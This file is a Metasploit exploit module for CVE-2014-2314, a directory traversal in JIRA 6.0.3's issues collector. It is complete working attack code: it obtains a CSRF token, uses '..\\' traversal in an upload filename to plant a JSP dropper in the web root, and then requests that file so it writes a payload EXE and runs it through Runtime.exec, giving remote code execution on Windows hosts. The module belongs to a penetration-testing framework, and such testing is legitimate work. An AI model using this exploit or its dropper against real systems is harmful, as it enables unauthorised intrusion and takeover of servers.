# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;JIRA Issues Collector Directory Traversal&#039;,
      &#039;Description&#039; => %q{
        This module exploits a directory traversal flaw in JIRA 6.0.3. The vulnerability exists
        in the issues collector code, while handling attachments provided by the user. It can be
        exploited in Windows environments to get remote code execution. This module has been tested
        successfully on JIRA 6.0.3 with Windows 2003 SP2 Server.
      },
      &#039;Author&#039;       =>
        [
          &#039;Philippe Arteau&#039;, # Vulnerability Discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2014-2314&#039;],
          [ &#039;OSVDB&#039;, &#039;103807&#039; ],
          [ &#039;BID&#039;, &#039;65849&#039; ],
          [ &#039;URL&#039;, &#039;https://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2014-02-26&#039; ],
          [ &#039;URL&#039;, &#039;http://blog.h3xstream.com/2014/02/jira-path-traversal-explained.html&#039; ]
        ],
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;Targets&#039;     =>
        [
          [ &#039;Jira 6.0.3 / Windows 2003 SP2&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Feb 26 2014&#039;))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to JIRA&#039;, &#039;/&#039;]),
        OptInt.new(&#039;COLLECTOR&#039;, [true, &#039;Collector ID&#039;])
      ], self.class)

    register_advanced_options(
      [
        # By default C:\Program Files\Atlassian\JIRA\atlassian-jira\QhVRutsh.jsp
        OptString.new(&#039;JIRA_PATH&#039;, [true, &#039;Path to the JIRA web folder from the Atlassian installation directory&#039;, "JIRA\\atlassian-jira"]),
        # By default file written to C:\Program Files\Atlassian\Application Data\JIRA\caches\tmp_attachments\$random_\, we want to traversal until &#039;Atlassian&#039;
        OptInt.new(&#039;TRAVERSAL_DEPTH&#039;, [true, &#039;Traversal depth&#039;, 6])
      ], self.class)
  end

  def get_upload_token
    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, "rest", "collectors", "1.0", "tempattachment", datastore[&#039;COLLECTOR&#039;]),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;data&#039;   => rand_text_alpha(10 + rand(10)),
        &#039;vars_get&#039; =>
          {
            &#039;filename&#039; => rand_text_alpha(10 + rand(10))
          }
      })

    if res and res.code == 500 and res.body =~ /"token":"(.*)"}/
      csrf_token = $1
      @cookie = res.get_cookies
    else
      csrf_token = ""
    end

    return csrf_token
  end

  def upload_file(filename, contents, csrf_token)
    traversal = "..\\" * datastore[&#039;TRAVERSAL_DEPTH&#039;]
    traversal << datastore[&#039;JIRA_PATH&#039;]

    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, "rest", "collectors", "1.0", "tempattachment", datastore[&#039;COLLECTOR&#039;]),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;data&#039;   => contents,
        &#039;cookie&#039; => @cookie,
        &#039;ctype&#039;  => &#039;text/plain&#039;,
        &#039;vars_get&#039; =>
          {
            &#039;filename&#039; => "#{traversal}\\#{filename}",
            &#039;atl_token&#039; => csrf_token
          }
      })

    if res and res.code == 201 and res.body =~ /\{"name":".*#{filename}"/
      register_files_for_cleanup("..\\..\\#{datastore[&#039;JIRA_PATH&#039;]}\\#{filename}")
      register_files_for_cleanup("..\\..\\#{datastore[&#039;JIRA_PATH&#039;]}\\#{@exe_filename}")
      return true
    else
      print_error("#{peer} - Upload failed...")
      return false
    end
  end

  def upload_and_run_jsp(filename, contents)
    print_status("#{peer} - Getting a valid CSRF token...")
    csrf_token = get_upload_token
    fail_with(Failure::Unknown, "#{peer} - Unable to find the CSRF token") if csrf_token.empty?

    print_status("#{peer} - Exploiting traversal to upload JSP dropper...")
    upload_file(filename, contents, csrf_token)

    print_status("#{peer} - Executing the dropper...")
    send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, filename),
        &#039;method&#039; => &#039;GET&#039;
      })
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;login.jsp&#039;),
    })

    if res and res.code == 200 and res.body =~ /<meta name="application-name" content="JIRA" data-name="jira" data-version="([0-9\.]*)">/
      version = $1
    else
      return Exploit::CheckCode::Unknown
    end

    if version <= "6.0.3"
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{peer} - Generating EXE...")
    exe = payload.encoded_exe
    @exe_filename = Rex::Text.rand_text_alpha(8) + ".exe"

    print_status("#{peer} - Generating JSP dropper...")
    dropper = jsp_drop_and_execute(exe, @exe_filename)
    dropper_filename = Rex::Text.rand_text_alpha(8) + ".jsp"

    print_status("#{peer} - Uploading and running JSP dropper...")
    upload_and_run_jsp(dropper_filename, dropper)
  end

  # This should probably go in a mixin (by egypt)
  def jsp_drop_bin(bin_data, output_file)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|

    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|

    jspraw << %Q|int numbytes = data.length();\n|

    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
    jspraw << %Q|{\n|
    jspraw << %Q|  char char1 = (char) data.charAt(counter);\n|
    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\n|
    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\n|
    jspraw << %Q|  comb <<= 4;\n|
    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\n|
    jspraw << %Q|  bytes[counter/2] = (byte)comb;\n|
    jspraw << %Q|}\n|

    jspraw << %Q|outputstream.write(bytes);\n|
    jspraw << %Q|outputstream.close();\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def jsp_execute_command(command)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|try {\n|
    jspraw << %Q|  Runtime.getRuntime().exec("chmod +x #{command}");\n|
    jspraw << %Q|} catch (IOException ioe) { }\n|
    jspraw << %Q|Runtime.getRuntime().exec("#{command}");\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def jsp_drop_and_execute(bin_data, output_file)
    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)
  end

end

